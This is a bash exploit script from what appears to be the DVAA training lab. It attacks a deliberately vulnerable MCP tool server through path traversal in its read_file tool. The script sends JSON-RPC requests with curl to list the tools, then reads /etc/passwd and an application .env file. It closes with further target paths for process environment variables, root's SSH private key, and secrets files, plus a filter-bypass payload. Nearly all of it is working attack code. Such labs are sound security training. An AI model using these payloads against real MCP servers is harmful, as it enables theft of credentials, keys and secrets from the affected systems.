#!/bin/bash
# =============================================================================
# DVAA Exploit: MCP Path Traversal
# Attack Class: MCP Exploitation / Path Traversal
# Target: ToolBot MCP Server (port 3010) - JSON-RPC 2.0
# Difficulty: Intermediate
#
# Description:
#   Exploits a vulnerable MCP tool server that exposes a read_file tool
#   without proper path validation. Uses ../ traversal to escape the
#   intended sandbox and read arbitrary files from the host filesystem.
# =============================================================================

set -euo pipefail

TARGET="http://localhost:3010/"

echo "=== MCP Path Traversal ==="
echo "Target: ToolBot MCP (port 3010)"
echo ""

# Step 1: List available tools
echo "[Step 1] Discovering available MCP tools..."
tools_response=$(curl -s "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/list",
    "params": {},
    "id": 0
  }' 2>/dev/null) || {
  echo "[ERROR] DVAA MCP server not running."
  echo "Start with: docker compose up -d"
  echo "Or: docker run -p 3000-3008:3000-3008 -p 3010-3013:3010-3013 -p 3020-3021:3020-3021 -p 9000:9000 opena2a/dvaa"
  exit 1
}

echo "$tools_response" | python3 -c "import sys,json; r=json.load(sys.stdin); print(json.dumps(r, indent=2))" 2>/dev/null || echo "$tools_response"
echo ""

# Step 2: Attempt path traversal to read /etc/passwd
echo "[Step 2] Attempting path traversal to read /etc/passwd..."
curl -s "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "read_file",
      "arguments": {"path": "/etc/passwd"}
    },
    "id": 1
  }' | python3 -c "import sys,json; r=json.load(sys.stdin); print(json.dumps(r, indent=2))" 2>/dev/null
echo ""

# Step 3: Try to read environment/config files
echo "[Step 3] Attempting to read application config..."
curl -s "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "read_file",
      "arguments": {"path": "../../../app/.env"}
    },
    "id": 2
  }' | python3 -c "import sys,json; r=json.load(sys.stdin); print(json.dumps(r, indent=2))" 2>/dev/null
echo ""

echo "---"
echo "Other paths to try:"
echo "  ../../../proc/self/environ    - Process environment variables"
echo "  ../../../root/.ssh/id_rsa     - SSH private key"
echo "  ../../../app/config/secrets.json - Application secrets"
echo "  ....//....//etc/passwd        - Double-encoding bypass"
